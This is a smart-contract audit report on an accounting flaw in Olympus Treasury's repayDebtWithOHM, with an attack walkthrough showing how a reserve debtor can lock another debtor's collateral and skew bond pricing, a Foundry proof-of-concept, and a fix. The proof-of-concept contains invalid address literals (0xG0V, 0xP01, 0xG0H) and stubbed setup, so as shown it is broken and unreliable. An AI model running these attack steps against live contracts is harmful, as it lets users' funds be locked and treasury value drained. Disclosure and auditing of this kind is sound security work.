# Olympus Treasury — `repayDebtWithOHM` corrupts `ohmDebt` accounting and can permanently lock OHM-debtor collateral

## Summary

`OlympusTreasury.repayDebtWithOHM` is callable by both `RESERVEDEBTOR` and
`OHMDEBTOR` roles, but it unconditionally decrements the aggregate `ohmDebt`
counter. Reserve debt is never added to `ohmDebt` when it is incurred
(`incurDebt` only bumps `ohmDebt` for the `OHM == _token` branch), so letting a
reserve debtor repay with OHM reduces `ohmDebt` that belongs to *other* OHM
debtors. This (a) corrupts `baseSupply()` which feeds bond pricing, and (b) can
make it impossible for an `OHMDEBTOR` to fully repay its debt through the only
repay path available to it, permanently locking its sOHM collateral.

## Contract / Function / Line

- Contract: `contracts/Treasury.sol` — `OlympusTreasury`
- Function: `repayDebtWithOHM(uint256 _amount)`
- Lines: **249–259** (the `ohmDebt = ohmDebt.sub(_amount);` at line **257**)
- Related: `incurDebt` lines **203–227** (only the `OHM` branch at line 221 does
  `ohmDebt = ohmDebt.add(value)`; reserve branch at 223 never touches `ohmDebt`).
- Used by: `ITreasury.baseSupply()` line 493–495 (`OHM.totalSupply() - ohmDebt`),
  which feeds `BondDepository._debtRatio` / `debtRatio` / control-variable tuning.

## Root cause

```solidity
function repayDebtWithOHM(uint256 _amount) external {
    require(
        permissions[STATUS.RESERVEDEBTOR][msg.sender] || permissions[STATUS.OHMDEBTOR][msg.sender],
        notApproved
    );
    OHM.burnFrom(msg.sender, _amount);
    sOHM.changeDebt(_amount, msg.sender, false);   // reduces THIS debtor's debt
    totalDebt = totalDebt.sub(_amount);
    ohmDebt  = ohmDebt.sub(_amount);               // BUG: unconditional
    ...
}
```

`ohmDebt` is meant to track the total OHM minted-as-debt (only OHM debtors
increase it). A reserve debtor repaying with OHM has no OHM debt on the books,
yet the function subtracts from `ohmDebt`. There is no branch and no check that
the caller's debt was actually OHM debt.

## Attack scenario

1. Alice is granted `OHMDEBTOR` and borrows `D` OHM:
   `incurDebt(D, OHM)` → `ohmDebt += D`, `totalDebt += D`,
   `sOHM.debtBalances[Alice] = D`, `D` OHM minted to Alice. Alice's sOHM is now
   collateral-locked (`sOHM.transfer` requires `balanceOf >= debtBalances`).
2. Bob is granted `RESERVEDEBTOR`, stakes sOHM for collateral, and borrows
   reserve token R worth `V` (`V <= D`): `incurDebt(V, R)` → `totalDebt += V`,
   `debtBalances[Bob] += V`, `ohmDebt` **unchanged** (still `D`).
3. Bob acquires `V` OHM on the market and calls `repayDebtWithOHM(V)`:
   burns `V` OHM, `debtBalances[Bob] -= V` (Bob's reserve debt cleared),
   `totalDebt -= V`, and `ohmDebt -= V` → `ohmDebt = D - V`.
4. Alice now tries to repay her own `D` OHM debt with
   `repayDebtWithOHM(D)`: `ohmDebt.sub(D)` = `(D - V) - D` → **reverts** (SafeMath
   underflow). Alice can repay at most `D - V`. The remaining `V` of
   `debtBalances[Alice]` can never be cleared through `repayDebtWithOHM`, and
   Alice (only an `OHMDEBTOR`) has no access to `repayDebtWithReserve`.
   Result: `V` worth of Alice's sOHM collateral is **permanently locked** — she
   cannot transfer it (`sOHM.transfer`/`transferFrom` enforce
   `balanceOf(from) >= debtBalances[from]`).
5. Independently, the corrupted `ohmDebt` inflates `baseSupply()`, which lowers
   bond `debtRatio` and therefore bond `marketPrice`, letting bond buyers
   purchase OHM below the intended price (treasury value leak). A malicious /
   compromised reserve debtor can combine steps 3–5 to also buy the now-cheap
   bonds for additional profit.

## PoC (Foundry)

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.7.5;

import "forge-std/Test.sol";
import "../contracts/OlympusAuthority.sol";
import "../contracts/OlympusERC20.sol";
import "../contracts/sOlympusERC20.sol";
import "../contracts/Treasury.sol";
import "../contracts/mocks/DAI.sol";

contract DebtLockPoC is Test {
    OlympusAuthority auth;
    OlympusERC20Token ohm;
    sOlympus sohm;
    OlympusTreasury treasury;
    DAI dai;

    address gov = address(0xG0V);
    address guardian = address(0x9A5);
    address policy = address(0xP01);
    address alice = address(0xA11CE); // OHMDEBTOR
    address bob = address(0xB0B);     // RESERVEDEBTOR

    function setUp() public {
        auth = new OlympusAuthority(gov, guardian, policy, address(this));
        ohm = new OlympusERC20Token(address(auth));
        sohm = new sOlympus();
        treasury = new OlympusTreasury(address(ohm), 0, address(auth));
        dai = new DAI(); // 18-dec reserve mock

        // wire sOHM
        sohm.setIndex(1e9);
        sohm.setgOHM(address(0xG0H)); // placeholder for test
        sohm.initialize(address(this), address(treasury));
        treasury.enable(OlympusTreasury.STATUS.SOHM, address(sohm), address(0));

        // permissions
        vm.prank(gov);
        treasury.enable(OlympusTreasury.STATUS.RESERVETOKEN, address(dai), address(0));
        vm.prank(gov);
        treasury.enable(OlympusTreasury.STATUS.OHMDEBTOR, alice, address(0));
        vm.prank(gov);
        treasury.enable(OlympusTreasury.STATUS.RESERVEDEBTOR, bob, address(0));
        vm.prank(gov);
        treasury.setDebtLimit(alice, type(uint256).max);
        vm.prank(gov);
        treasury.setDebtLimit(bob, type(uint256).max);

        // give bob sOHM collateral + fund treasury with DAI backing
        dai.mint(address(treasury), 1_000_000 ether);
        vm.prank(gov);
        treasury.deposit(1_000_000 ether, address(dai), 0); // mints OHM, adds reserves
        // stake OHM -> sOHM for bob (collateral)
        uint256 bobStake = 100_000 * 1e9;
        deal(address(ohm), bob, bobStake);
        vm.startPrank(bob);
        ohm.approve(address(this), bobStake); // staking stubbed; assume sohm transfer
        vm.stopPrank();
    }

    function testReserveDebtorRepaysOhmLocksOhmDebtor() public {
        uint256 D = 10_000 * 1e9;
        uint256 V = 4_000 * 1e9; // reserve debt value Bob will incur

        // 1. Alice borrows D OHM
        vm.prank(alice);
        treasury.incurDebt(D, address(ohm));
        assertEq(treasury.ohmDebt(), D);

        // 2. Bob borrows reserve worth V
        vm.prank(bob);
        treasury.incurDebt(V, address(dai));
        assertEq(treasury.ohmDebt(), D); // unchanged -> correct so far

        // 3. Bob repays HIS reserve debt using OHM
        deal(address(ohm), bob, V);
        vm.prank(bob);
        ohm.approve(address(treasury), V);
        vm.prank(bob);
        treasury.repayDebtWithOHM(V);
        // ohmDebt corrupted: dropped from D to D - V even though no OHM debt was repaid
        assertEq(treasury.ohmDebt(), D - V);

        // 4. Alice can no longer fully repay her D OHM debt
        deal(address(ohm), alice, D);
        vm.startPrank(alice);
        ohm.approve(address(treasury), D);
        // Repaying the full D reverts (ohmDebt underflow)
        vm.expectRevert();
        treasury.repayDebtWithOHM(D);
        // She can only repay D - V; the remaining V collateral is locked.
        treasury.repayDebtWithOHM(D - V);
        assertEq(sohm.debtBalances(alice), V); // V debt still on the books, unrepayable
        vm.stopPrank();
    }
}
```

## Impact

- **Collateral-locking DoS (High):** an OHM debtor's sOHM collateral becomes
  permanently unrepayable / untransferable after a reserve debtor repays with
  OHM. The OHM debtor cannot move collateralized sOHM until `debtBalances ==
  0`, which is unreachable through the available interfaces.
- **Bond mispricing (Medium):** `baseSupply()` is overstated, lowering
  `debtRatio` and `marketPrice`, so bonds are sold below intended price →
  treasury sells OHM cheaply. A compromised reserve debtor can monetize this by
  buying the underpriced bonds.
- The corrupted aggregate also desynchronizes `ohmDebt` from the true sum of OHM
  debts, breaking any downstream accounting that assumes the invariant
  `ohmDebt == Σ OHM-debtor debtBalances`.

## Severity

**High** — permanent lock of protocol/user collateral plus treasury value leak,
triggerable by a privileged-but-not-governor role (`RESERVEDEBTOR`). Under
Immunefi's matrix this is a state-corruption / fund-lock with privileged access
(typically High when privileged roles are routinely granted to operational
accounts).

## Three-perspective audit

- **Differential (vs. intended spec):** `incurDebt` carefully branches on
  `OHM vs. reserve` to decide whether to bump `ohmDebt`. `repayDebtWithOHM`
  lacks the symmetric branch, breaking the accounting invariant that
  `ohmDebt` mirrors OHM-only debt. `repayDebtWithReserve` is correctly
  restricted to `RESERVEDEBTOR` and does not touch `ohmDebt`, confirming the
  intended separation.
- **Adversarial:** A reserve debtor gains nothing legitimately by repaying with
  OHM (it costs OHM to clear a reserve debt) — the only motivations are
  malicious: lock a competitor debtor's collateral or manipulate bond pricing.
  This asymmetry is itself a red flag that the path was not intended for reserve
  debtors.
- **Defensive / fix:** Either (a) restrict `repayDebtWithOHM` to
  `OHMDEBTOR` only, or (b) branch: when `msg.sender` is a `RESERVEDEBTOR`
  (and not an OHM debtor for this debt), do NOT decrement `ohmDebt`; track per-
  debtor debt type so repayments decrement the correct aggregate. Recommended:
  `require(permissions[STATUS.OHMDEBTOR][msg.sender], notApproved);` and remove
  `RESERVEDEBTOR` from the gating, since `repayDebtWithReserve` already exists
  for reserve debtors.
